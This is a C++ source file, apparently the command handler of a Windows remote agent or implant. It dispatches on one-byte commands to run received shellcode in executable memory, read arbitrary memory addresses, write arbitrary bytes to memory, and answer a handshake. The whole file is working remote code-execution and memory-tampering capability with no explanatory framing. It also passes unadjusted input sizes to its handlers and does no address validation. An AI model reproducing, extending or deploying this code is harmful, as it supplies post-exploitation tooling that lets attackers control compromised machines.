#include "global.hpp"
#include <stdint.h>
#include <cstring>

//#define PROFILE
//#define DEBUG
#ifdef PROFILE
#include <iostream>
using namespace std;
#endif
#ifdef DEBUG
#include <iostream>
using namespace std;
#endif

using namespace std;

typedef unsigned long long (*ShellcodeFunc)();
size_t createHandshake(char* resp, size_t respMax);

bool handleHandshake(
    char* output,
    size_t outputCapacity,
    size_t& outputSize
) {
    if (outputCapacity < 1) return false;

    outputSize = createHandshake(output, outputCapacity);
    return true;
}

bool handleExecuteShellcode(
    const char* input,
    size_t inputSize,
    char* output,
    size_t outputCapacity,
    size_t& outputSize,
    PVOID execution_mem
) {
#ifdef PROFILE
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
#endif

    // Format: [Type 0x01][8-byte size][Shellcode Bytes]
    if (inputSize < 8) return false;

    uint64_t sc_size = *(uint64_t*)(input);

    if (inputSize < (8 + sc_size)) return false;

    memcpy(execution_mem, input + 8, (size_t)sc_size);
    ShellcodeFunc exec = (ShellcodeFunc)execution_mem;

#ifdef DEBUG
    cout << "Executing " << hex << (unsigned long long)execution_mem
         << ". Size " << (dec) << sc_size << endl;
#endif

    unsigned long long result = exec();

    // Format response: [Type 0x01][8-byte result]
    if (outputCapacity < 9) return false;
    memcpy(output, &result, 8);
    outputSize = 8;

#ifdef PROFILE
    QueryPerformanceCounter(&end);
    double time = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
    cout << "handleExecuteShellcode Time: " << time << " seconds (Execution)\n";
#endif

    return true;
}

void handleReadMemory(
    const char* input,
    size_t inputSize,
    char* output,
    size_t outputCapacity,
    size_t& outputSize
) {
#ifdef PROFILE
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
#endif

    // Format: [Type 0x02][8-byte addr][8-byte len]
    if (inputSize < 16) return;

    uint64_t startAddr = *(uint64_t*)(input);
    uint64_t readLen = *(uint64_t*)(input+8);

    if (readLen > outputCapacity) {
        readLen = outputCapacity;
    }

    #ifdef DEBUG
        cout << "Reading from " << hex << (unsigned long long)startAddr
            << ". Size " << (dec) << readLen << endl;
    #endif

    memcpy(output, (void*)startAddr, (size_t)readLen);
    outputSize = (size_t)readLen;

    #ifdef PROFILE
        QueryPerformanceCounter(&end);
        double time = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
        cout << "handleReadMemoryTime: " << time << " seconds (Read)\n";
    #endif

}

void handleWriteMemory(
    const char* input,
    size_t inputSize
) {
#ifdef PROFILE
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
#endif

    // Format: [Type 0x03][8-byte addr][8-byte len][Data...]
    if (inputSize < 16) return;

    uint64_t writeAddr = *(uint64_t*)(input);
    uint64_t writeLen = *(uint64_t*)(input + 8);

    if (inputSize < (16 + writeLen)) return;

    #ifdef DEBUG
        cout << "Writing to " << hex << (unsigned long long)writeAddr
            << ". Size " << (dec) << writeLen << endl;
    #endif

    memcpy((void*)writeAddr, input + 16, (size_t)writeLen);

    #ifdef PROFILE
        QueryPerformanceCounter(&end);
        double time = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
        cout << "Time: " << time << " seconds (Write)\n";
    #endif
}
bool handleMessage(
    const char* input,
    size_t inputSize,
    char* output,
    size_t outputCapacity,
    size_t& outputSize,
    PVOID execution_mem
) {
    if (inputSize == 0) {
        outputSize = 0;
        return false;
    }

    uint8_t type = (uint8_t)input[0];
    outputSize = 0;

    switch (type) {
        case 0x00:
            if(handleHandshake(output+1, outputCapacity-1, outputSize)){
                output[0] = 0;
                outputSize++;
            }
            else{
                output[0] = 0;
                outputSize = 1;
            }
            #ifdef DEBUG
            cout << "Handshake: " << output+1 << endl;
            #endif
            break;

        case 0x01:
            handleExecuteShellcode(input+1,inputSize, output+1, outputCapacity-1, outputSize, execution_mem);
            output[0] = 1;
            outputSize++;
            break;

        case 0x02:
            handleReadMemory(input+1,inputSize, output+1, outputCapacity-1, outputSize);
            output[0] = 1;
            outputSize++;
            break;

        case 0x03:
            handleWriteMemory(input+1,inputSize);
            output[0] = 1;
            outputSize++;
            break;
        case 0x04:
            output[0] = 2;
            outputSize++;
            break;

        default:
        {
            #ifdef DEBUG
            cout << "Unrecognized command: " << (hex) << (unsigned int) type << endl;
            #endif
            return false;
        }
            
    }
    return true;
}